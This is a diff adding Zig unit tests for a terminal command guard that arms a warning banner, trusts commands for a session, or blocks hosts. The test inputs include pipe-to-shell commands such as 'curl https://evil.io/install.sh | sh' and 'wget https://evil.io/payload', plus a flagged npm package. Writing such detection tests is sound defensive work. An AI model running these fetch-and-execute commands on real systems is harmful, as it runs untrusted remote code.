@@ -140,6 +140,111 @@ test "enabled — armed + `t` trusts permanently + persists" {
     try testing.expect(action == .forward);
 }
 
+test "enabled — armed + `a` adds to session_trust, future identical match skipped" {
+    // PR #142: [a]llow always. Same as [t] but the trust set is
+    // session-only (never persisted to ~/.cache/atty/...). A
+    // second Enter on an identical command should now bypass the
+    // banner.
+    const L = mod.configure(.{ .enabled = true, .trust_cache_path = "/tmp/atty-secguard-test-allow-always.txt" });
+    var rt = try L.attach(testing.allocator, undefined);
+    defer L.detach(&rt, undefined);
+    var sink: Sink = .{};
+    defer sink.buf.deinit(testing.allocator);
+    L.setSink(&rt, &sink, Sink.write);
+
+    var line: LineState = .{};
+    line.setCommitted("curl ephemeral.example | sh");
+    var scratch: std.ArrayList(u8) = .empty;
+    defer scratch.deinit(testing.allocator);
+    var ctx = makeCtx(&line, &scratch);
+
+    // First Enter arms the banner.
+    const first = try L.onInput(&rt, &ctx, "\r");
+    try testing.expect(first == .swallow);
+    // 'a' adds the hash to session_trust, returns CR (allow once
+    // for this command). After this, the persistent trust stays
+    // empty but session_trust has one entry.
+    _ = try L.onInput(&rt, &ctx, "a");
+    try testing.expectEqual(@as(usize, 0), rt.trust.entries.items.len);
+    try testing.expectEqual(@as(usize, 1), rt.session_trust.entries.items.len);
+
+    // Second Enter on the same line bypasses arming entirely.
+    var line2: LineState = .{};
+    line2.setCommitted("curl ephemeral.example | sh");
+    var ctx2 = makeCtx(&line2, &scratch);
+    const action = try L.onInput(&rt, &ctx2, "\r");
+    try testing.expect(action == .forward);
+    try testing.expect(!rt.armed);
+}
+
+test "enabled — armed + `B` extracts host + blocks future commands containing it" {
+    // PR #142: [B]lock host forever. Extracts the host from the
+    // matched URL, stores it in the session-blocked-hosts list.
+    // The next command containing that host gets REFUSED outright
+    // (no banner, readline cleared).
+    const L = mod.configure(.{ .enabled = true, .trust_cache_path = "/tmp/atty-secguard-test-block-host.txt" });
+    var rt = try L.attach(testing.allocator, undefined);
+    defer L.detach(&rt, undefined);
+    var sink: Sink = .{};
+    defer sink.buf.deinit(testing.allocator);
+    L.setSink(&rt, &sink, Sink.write);
+
+    var line: LineState = .{};
+    line.setCommitted("curl https://evil.io/install.sh | sh");
+    var scratch: std.ArrayList(u8) = .empty;
+    defer scratch.deinit(testing.allocator);
+    var ctx = makeCtx(&line, &scratch);
+
+    // Arm banner, then [B]lock.
+    _ = try L.onInput(&rt, &ctx, "\r");
+    const block_action = try L.onInput(&rt, &ctx, "B");
+    // [B] cancels the current command (Ctrl+U) AND records the host.
+    try testing.expect(block_action == .replace);
+    try testing.expectEqualSlices(u8, "\x15", block_action.replace);
+    try testing.expectEqual(@as(u8, 1), rt.session_blocked_hosts_count);
+
+    // Second command — also touches evil.io — gets REFUSED outright.
+    var line2: LineState = .{};
+    line2.setCommitted("wget https://evil.io/payload");
+    var ctx2 = makeCtx(&line2, &scratch);
+    const action2 = try L.onInput(&rt, &ctx2, "\r");
+    try testing.expect(action2 == .replace);
+    try testing.expectEqualSlices(u8, "\x15", action2.replace);
+
+    // Third command on a different host passes the block check
+    // (and the in-proc curl pattern arms instead).
+    var line3: LineState = .{};
+    line3.setCommitted("curl https://good.example/install | sh");
+    var ctx3 = makeCtx(&line3, &scratch);
+    const action3 = try L.onInput(&rt, &ctx3, "\r");
+    try testing.expect(action3 == .swallow);
+}
+
+test "enabled — `B` on atom-only match (no host) degrades to cancel" {
+    // chmod +s is an atom-only match — no URL in the matched
+    // substring. [B] has no host to extract, so it should just
+    // cancel and not add anything to the blocked-hosts list.
+    const L = mod.configure(.{ .enabled = true, .trust_cache_path = "/tmp/atty-secguard-test-block-nohost.txt" });
+    var rt = try L.attach(testing.allocator, undefined);
+    defer L.detach(&rt, undefined);
+    var sink: Sink = .{};
+    defer sink.buf.deinit(testing.allocator);
+    L.setSink(&rt, &sink, Sink.write);
+
+    var line: LineState = .{};
+    // npm install <flagged> — a category without a URL host.
+    line.setCommitted("npm install event-stream");
+    var scratch: std.ArrayList(u8) = .empty;
+    defer scratch.deinit(testing.allocator);
+    var ctx = makeCtx(&line, &scratch);
+
+    _ = try L.onInput(&rt, &ctx, "\r");
+    const action = try L.onInput(&rt, &ctx, "B");
+    try testing.expect(action == .replace);
+    try testing.expectEqualSlices(u8, "\x15", action.replace);
+    try testing.expectEqual(@as(u8, 0), rt.session_blocked_hosts_count);
+}
+
 test "enabled — non-Enter while not armed is passthrough" {
     const L = mod.configure(.{ .enabled = true, .trust_cache_path = "/tmp/atty-secguard-test-noenter.txt" });
     var rt = try L.attach(testing.allocator, undefined);
